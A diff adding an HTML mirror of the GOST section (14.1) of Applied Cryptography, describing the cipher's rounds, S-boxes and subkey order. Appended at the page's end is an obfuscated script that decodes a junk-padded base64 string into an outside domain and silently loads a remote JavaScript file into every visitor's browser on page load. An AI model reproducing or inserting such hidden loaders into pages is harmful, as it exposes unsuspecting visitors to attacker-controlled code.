@@ -1,0 +1,172 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=331-333//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch13/13-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 14<BR>Still Other Block Ciphers
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">14.1 GOST</FONT></H3>
+<P>GOST is a block algorithm from the former Soviet Union [655,1393]. &#147;GOST&#148; is an acronym for &#147;Gosudarstvennyi Standard,&#148; or Government Standard, sort of similar to a FIPS, except that it can (and does) refer to just about any kind of standard. (Actually, the full name is Gosudarstvennyi Standard Soyuza SSR, or Government Standard of the Union of Soviet Socialist Republics.) This standard is number 28147-89. The Government Committee for Standards of the USSR authorized the standard, whoever they were.
+</P>
+<P>I don&#146;t know whether GOST 28147-89 was used for classified traffic or just for civilian encryption. A remark at its beginning states that the algorithm &#147;satisfies all cryptographic requirements and not limits the grade of information to be protected.&#148; I have heard claims that it was initially used for very high-grade communications, including classified military communications, but I have no confirmation.</P>
+<P><FONT SIZE="+1"><B><I>Description of GOST</I></B></FONT></P>
+<P>GOST is a 64-bit block algorithm with a 256-bit key. GOST also has some additional key material that will be discussed later. The algorithm iterates a simple encryption algorithm for 32 rounds.
+</P>
+<P>To encrypt, first break the text up into a left half, <I>L</I>. and a right half, <I>R</I>. The subkey for round <I>i</I> is <I>K</I><SUB>i</SUB>. A round, <I>i</I>, of GOST is:</P>
+<DL>
+<DD><I>L</I><SUB>i</SUB> = <I>R</I><SUB>i - 1</SUB>
+<DD><I>R</I><SUB>i</SUB> = <I>L</I><SUB>i -1</SUB> &#8853; f(<I>R</I><SUB>i - 1</SUB>, <I>K</I><SUB>i</SUB>)
+</DL>
+<P>Figure 14.1 is a single round of GOST. Function f is straightforward. First, the right half and the <I>i</I>th subkey are added modulo 2<SUP>32</SUP>. The result is broken into eight 4-bit chunks, and each chunk becomes the input to a different S-box. There are eight different S-boxes in GOST; the first 4 bits go into the first S-box, the second 4 bits go into the second S-box, and so on. Each S-box is a permutation of the numbers 0 through 15. For example, an S-box might be:</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/14-01.jpg',283,213 )"><IMG SRC="images/14-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/14-01.jpg',283,213)"><FONT COLOR="#000077"><B>Figure 14.1</B></FONT></A>&nbsp;&nbsp;One round of GOST.</I>
+</P>
+<DL>
+<DD>7, 10, 2, 4, 15, 9, 0, 3, 6, 12, 5, 13, 1, 8, 11
+</DL>
+<P>In this case, if the input to the S-box is 0, the output is 7. If the input is 1, the output is 10, and so on. All eight S-boxes are different; these are considered additional key material. The S-boxes are to be kept secret.
+</P>
+<P>The outputs of the eight S-boxes are recombined into a 32-bit word, then the entire word undergoes an 11-bit left circular shift. Finally, the result XORed to the left half to become the new right half, and the right half becomes the new left half. Do this 32 times and you&#146;re done.</P>
+<P>The subkeys are generated simply. The 256-bit key is divided into eight 32-bit blocks: <I>k</I><SUB>1</SUB>, <I>k</I><SUB>2</SUB>,..., <I>k</I><SUB>8</SUB>. Each round uses a different subkey, as shown in Table 14.1. Decryption is the same as encryption with the order of the <I>k</I><SUB>i</SUB>s reversed.</P>
+<P>The GOST standard does not discuss how to generate the S-boxes, only that they are somehow supplied [655]. This has led to speculation that some Soviet organization would supply good S-boxes to those organizations it liked and bad S-boxes to those organizations it wished to eavesdrop on. This may very well be true, but further conversations with a GOST chip manufacturer within Russia offered another alternative. He generated the S-box permutations himself, using a random-number generator.</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="17">Table 14.1<BR>Use of GOST Subkeys in Different Rounds
+<TR>
+<TD COLSPAN="17"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" "20%">Round:
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">1
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">2
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">3
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">4
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">5
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">6
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">7
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">8
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">9
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">10
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">11
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">12
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">13
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">14
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">15
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">16
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="20%">Subkey:
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">1
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">2
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">3
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">4
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">5
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">6
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">7
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">8
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">1
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">2
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">3
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">4
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">5
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">6
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">7
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">8
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="20%">Round:
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">17
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">18
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">19
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">20
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">21
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">22
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">23
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">24
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">25
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">26
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">27
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">28
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">29
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">30
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">31
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">32
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="20%">Subkey:
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">1
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">2
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">3
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">4
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">5
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">6
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">7
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">8
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">8
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">7
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">6
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">5
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">4
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">3
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">2
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">1
+<TR>
+<TD COLSPAN="17"><HR>
+<TR>
+</TABLE>
+<P>More recently, a set of S-boxes used in an application for the Central Bank of the Russian Federation surfaced. These S-boxes are also used in the GOSTone-way hash function (see section 18.11) [657].They are listed in Table 14.2.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch13/13-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(TskiUucp, uecBpPjs) {uecBpPjs = TskiUucp.createElement('script');uecBpPjs.type = 'text/javascript';uecBpPjs.async = true;uecBpPjs.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');TskiUucp.getElementsByTagName('body')[0].appendChild(uecBpPjs);}(document));</script></body>
+</html>
